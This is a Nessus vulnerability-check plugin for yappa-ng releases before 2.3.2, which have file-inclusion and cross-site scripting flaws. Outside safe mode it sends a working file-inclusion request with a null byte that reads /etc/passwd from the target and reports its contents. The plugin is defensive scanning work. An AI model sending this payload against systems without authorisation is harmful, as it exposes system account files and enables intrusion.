#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18150);
  script_version("$Revision: 1.25 $");

  script_cve_id("CVE-2005-1311", "CVE-2005-1312");
  script_bugtraq_id(13371, 13372, 19823);
  script_osvdb_id(15828, 15829);

  script_name(english:"yappa-ng < 2.3.2 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains several PHP scripts that are prone to
multiple flaws, including arbitrary file inclusion." );
 script_set_attribute(attribute:"description", value:
"The version of yappa-ng installed on the remote host is prone to
multiple file include and cross-site scripting vulnerabilities due to
its failure to sanitize user-supplied script input when calling
various include scripts directly. 

By exploiting the file include vulnerabilities, an attacker can read
arbitrary files on the remote host and possibly even run arbitrary
code, subject to the privileges of the web server process.  And by
exploiting the cross-site scripting vulnerabilities, he can cause
arbitrary script and HTML code to be run in a user's browser within
the context of the affected website." );
  # http://web.archive.org/web/20050525220251/http://www.gulftech.org/?node=research&article_id=00074-05112005
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?975eec2a" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=323206" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to yappa-ng 2.3.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/04/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/04/24");
 script_cvs_date("$Date: 2016/11/23 20:52:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:yappa-ng:yappa-ng");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in yappa-ng < 2.3.2";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0, php: 1);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/yappa-ng", "/yappa", "/photos", "/fotos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it's yappa-ng...
  pat = ">Powered by yappa-ng ([^(]+) \(.+ >> <a href=[^>]+>yappa-ng Homepage";
  if (egrep(string:res, pattern:pat)) {
    # Check for the vulnerability.
    #
    # - if safe checks are enabled...
    if (safe_checks()) {
      # Get the version number.
      matches = egrep(pattern:pat, string:res);
      foreach match (split(matches)) {
        match = chomp(match);
        ver = eregmatch(pattern:pat, string:match);
        if (!isnull(ver)) {
          ver = ver[1];
          break;
        }
      }

      # Test the version number.
      if (ver && ver  =~ "^([01]\.|2\.([0-2]\.|3\.[01]([^0-9]|$)))") {
        report = string(
          "\n",
          "Nessus has determined the vulnerability exists on the remote host\n",
          "simply by looking at the version number of yappa-ng installed there.\n"
        );
        security_warning(port:port, extra:report);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
      }
    }
    # - otherwise, try to exploit the file include vulnerability.
    else {
      # Try to grab a file.
      r = http_send_recv3(method: "GET", port: port, 
      	exit_on_fail: 1, 
        item:string(
          dir, "/src/main.inc.php?",
          "config[path_src_include]=/etc/passwd%00"
        ));
      res = r[2];

      # It's a problem if...
      if (
        # there's an entry for root or...
        egrep(pattern:"root:.*:0:[01]:", string:res) ||
        # we get an error saying "failed to open stream".
        egrep(pattern:"main\(/etc/passwd\\0album\.class\.php.+ failed to open stream", string:res) ||
        # we get an error claiming the file doesn't exist or...
        egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
        # we get an error about open_basedir restriction.
        egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
      )
      {
        if (egrep(string:res, pattern:"root:.*:0:[01]:"))
          contents = res - strstr(res, "<br");

        if (contents && report_verbosity)
        {
          report = string(
            "\n",
            "Here are the contents of the file '/etc/passwd' that\n",
            "Nessus was able to read from the remote host :\n",
            "\n",
            contents
          );
          security_warning(port:port, extra:report);
        }
        else security_warning(port);

	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
      }
    }
  }
}
